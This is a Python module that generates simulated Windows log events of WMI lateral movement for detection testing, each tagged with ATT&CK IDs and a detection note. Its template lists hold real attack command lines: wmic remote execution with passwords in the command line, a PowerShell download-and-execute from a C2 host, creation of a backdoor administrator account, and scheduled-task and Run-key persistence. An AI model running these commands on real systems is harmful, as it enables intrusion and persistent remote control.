"""
simulator/wmi.py
─────────────────────────────────────────────────────────────────────────────
Simulates remote process creation via Windows Management Instrumentation (WMI).

Attack chain modelled
─────────────────────
  WmiPrvSE.exe  →  cmd.exe / powershell.exe  (lateral movement)

Techniques covered
──────────────────
  • T1047    — Windows Management Instrumentation
  • T1021    — Remote Services (lateral movement via WMI)
  • T1569.002 — System Services: Service Execution (wmic.exe)
  • T1078    — Valid Accounts (using stolen credentials)

WMI is an extremely popular lateral movement technique because:
  1. WmiPrvSE.exe is a legitimate Windows binary.
  2. Activity appears under a trusted parent and is often whitelisted.
  3. It does not require an SMB connection like PsExec.

Usage
─────
    python wmi.py --count 8 --pretty
    python wmi.py --count 100 --output logs/wmi_sim.jsonl --scenario lateral_move
"""

from __future__ import annotations

import argparse
import sys
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).parent))
from base import EventGenerator


# ── Attack payload / command templates ────────────────────────────────────────

# wmic.exe invocations on the *initiating* host
_WMIC_INITIATOR_CMDS: list[str] = [
    (
        'wmic /node:"{target}" /user:"{domain}\\{user}" /password:"{pwd}" '
        'process call create "cmd.exe /c {payload}"'
    ),
    (
        'wmic /node:"{target}" process call create '
        '"powershell.exe -nop -w hidden -enc {b64}"'
    ),
    (
        'wmic /node:"{target}" /user:"{domain}\\{user}" '
        'process call create "net user backdoor P@ssw0rd! /add"'
    ),
    (
        'wmic /node:"{target}" process call create '
        '"reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
        '/v svc /t REG_SZ /d C:\\windows\\temp\\payload.exe /f"'
    ),
]

# Commands spawned on the *remote* target by WmiPrvSE.exe
_REMOTE_PAYLOADS: list[str] = [
    "cmd.exe /c whoami > C:\\windows\\temp\\out.txt",
    "cmd.exe /c net user /domain",
    "cmd.exe /c ipconfig /all",
    "cmd.exe /c tasklist /v",
    "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient)"
    ".DownloadString('http://{c2}/stage2.ps1')\"",
    "cmd.exe /c copy \\\\{c2}\\share\\beacon.exe C:\\windows\\temp\\svchost.exe"
    " && C:\\windows\\temp\\svchost.exe",
    "cmd.exe /c schtasks /create /sc minute /mo 5 /tn WindowsUpdate "
    "/tr C:\\windows\\temp\\payload.exe /ru SYSTEM",
    "cmd.exe /c net localgroup administrators hacked_user /add",
    "cmd.exe /c reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\""
    " /v fDenyTSConnections /t REG_DWORD /d 0 /f",
]

_DOMAINS: list[str] = ["CORP", "ACME", "INTERNAL", "HQ"]
_PASSWORDS: list[str] = [
    "Winter2024!", "P@ssword1", "Admin123!", "Changeme1"
]  # obviously simulated / non-functional
_C2_HOSTS: list[str] = [
    "192.168.88.100",
    "10.10.14.23",
    "172.16.5.50",
    "wpad.internal",
]
_CHILDREN: list[str] = ["cmd.exe", "powershell.exe", "net.exe", "reg.exe", "schtasks.exe"]


# ─────────────────────────────────────────────────────────────────────────────
# WMIRemoteExecutionSimulator
# ─────────────────────────────────────────────────────────────────────────────

class WMIRemoteExecutionSimulator(EventGenerator):
    """Simulates WMI-based remote process creation events.

    Two complementary event types are generated on each call to
    :meth:`generate_event`:

    1. **Initiator event** — ``wmic.exe`` running on the *attacker-controlled*
       host, connecting to a remote target.
    2. **Target event** — ``WmiPrvSE.exe`` spawning a child process on the
       *victim* host.

    By default, :meth:`emit` outputs only the target-side event (the one a
    SIEM would typically alert on).  Use :meth:`emit_pair` to get both.

    Parameters
    ----------
    emit_initiator:
        When *True*, :meth:`generate_event` returns the initiator-side
        ``wmic.exe`` event instead of the target-side WmiPrvSE event.
    **kwargs:
        Forwarded to :class:`~base.EventGenerator`.
    """

    SOURCE = "wmi_remote_exec"

    def __init__(self, emit_initiator: bool = False, **kwargs: Any) -> None:
        kwargs.setdefault("source", self.SOURCE)
        super().__init__(**kwargs)
        self._emit_initiator = emit_initiator

    # ── Core generator ────────────────────────────────────────────────────────

    def generate_event(self) -> dict[str, Any]:
        """Return one WMI process-creation event (target-side by default)."""
        return (
            self._initiator_event()
            if self._emit_initiator
            else self._target_event()
        )

    def _target_event(self) -> dict[str, Any]:
        """WmiPrvSE.exe spawning a suspicious child on the victim host."""
        c2      = self._choice(_C2_HOSTS)
        child   = self._choice(_CHILDREN)
        payload = (
            self._choice(_REMOTE_PAYLOADS)
            .replace("{c2}", c2)
            .replace("{target}", self._choice(self.hosts))
        )

        return self._base_event(
            process        = child,
            parent_process = "WmiPrvSE.exe",
            command        = payload,
            severity       = "high",
            tags           = [
                "T1047",        # WMI
                "T1021",        # Remote Services
                "lateral-movement",
                "wmiprvse-parent",
                "living-off-the-land",
            ],
            extra = {
                "wmi_namespace"     : "root\\cimv2",
                "wmi_class"         : "Win32_Process",
                "wmi_method"        : "Create",
                "c2_address"        : c2,
                "detection_note"    : (
                    "WmiPrvSE.exe spawning cmd/powershell is rarely legitimate "
                    "and is a high-confidence indicator of WMI lateral movement."
                ),
            },
        )

    def _initiator_event(self) -> dict[str, Any]:
        """wmic.exe being used to pivot to a remote host."""
        target = self._choice(self.hosts)
        domain = self._choice(_DOMAINS)
        user   = self._choice(self.users)
        pwd    = self._choice(_PASSWORDS)
        cmd    = (
            self._choice(_WMIC_INITIATOR_CMDS)
            .replace("{target}", target)
            .replace("{domain}", domain)
            .replace("{user}", user)
            .replace("{pwd}", pwd)
            .replace("{b64}", self._randhex(88))
            .replace(
                "{payload}",
                "cmd.exe /c whoami > C:\\windows\\temp\\out.txt",
            )
        )

        return self._base_event(
            process        = "wmic.exe",
            parent_process = "cmd.exe",
            command        = cmd,
            severity       = "medium",
            tags           = [
                "T1047",
                "T1069",        # Permission Groups Discovery
                "wmic",
                "credential-in-cmdline",
            ],
            extra = {
                "remote_target"  : target,
                "domain"         : domain,
                "credential_user": f"{domain}\\{user}",
                "detection_note" : (
                    "wmic.exe with /node: and credentials in the command line "
                    "is a strong indicator of credential re-use / lateral movement."
                ),
            },
        )

    # ── Scenario generators ───────────────────────────────────────────────────

    def generate_event_pair(self) -> tuple[dict[str, Any], dict[str, Any]]:
        """Return (initiator_event, target_event) as a correlated pair."""
        orig = self._emit_initiator
        self._emit_initiator = True
        initiator = self.generate_event()
        self._emit_initiator = False
        target = self.generate_event()
        self._emit_initiator = orig
        # Correlate via a shared lateral movement ID
        correlation_id = self._randhex(12)
        initiator.setdefault("extra", {})["correlation_id"] = correlation_id
        target.setdefault("extra", {})["correlation_id"] = correlation_id
        return initiator, target

    def emit_pair(self) -> tuple[dict[str, Any], dict[str, Any]]:
        """Emit both sides of a WMI lateral movement and return both events."""
        initiator, target = self.generate_event_pair()
        self.emit(initiator)
        self.emit(target)
        return initiator, target

    def generate_service_creation_event(self) -> dict[str, Any]:
        """Return a WMI-based service creation event (T1543.003)."""
        svc_name  = self._choice(["WindowsUpdater", "SvcHelper", "NetMon", "SysAgent"])
        svc_path  = f"C:\\windows\\temp\\{self._randhex(8)}.exe"
        cmd = (
            f'wmic /node:"{self._choice(self.hosts)}" '
            f'service call create "{svc_name}","{svc_path}",,'
            f'"C:\\windows\\system32\\{svc_name.lower()}.exe",16,1'
        )
        return self._base_event(
            process        = "wmic.exe",
            parent_process = "cmd.exe",
            command        = cmd,
            severity       = "critical",
            tags           = ["T1543.003", "T1047", "service-creation", "persistence"],
            extra          = {
                "service_name" : svc_name,
                "service_binary": svc_path,
                "detection_note": (
                    "WMI service creation to temp paths is a hallmark of "
                    "adversary persistence via Win32_Service."
                ),
            },
        )


# ── CLI entry point ───────────────────────────────────────────────────────────

def _parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Simulate WMI remote process-creation events.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--count", "-n", type=int, default=5)
    parser.add_argument(
        "--scenario",
        choices=["target", "initiator", "pair", "service_creation"],
        default="target",
        help=(
            "target: WmiPrvSE.exe spawning child (default). "
            "initiator: wmic.exe outbound call. "
            "pair: both sides of the lateral movement. "
            "service_creation: WMI-based service creation."
        ),
    )
    parser.add_argument("--output", "-o", type=str, default=None)
    parser.add_argument("--pretty", action="store_true")
    parser.add_argument("--seed", type=int, default=None)
    return parser.parse_args()


def main() -> None:
    args = _parse_args()
    sim = WMIRemoteExecutionSimulator(
        output_file=args.output,
        pretty=args.pretty,
        seed=args.seed,
    )

    for _ in range(args.count):
        if args.scenario == "initiator":
            sim._emit_initiator = True
            sim.emit()
        elif args.scenario == "pair":
            sim.emit_pair()
        elif args.scenario == "service_creation":
            sim.emit(sim.generate_service_creation_event())
        else:
            sim._emit_initiator = False
            sim.emit()


if __name__ == "__main__":
    main()

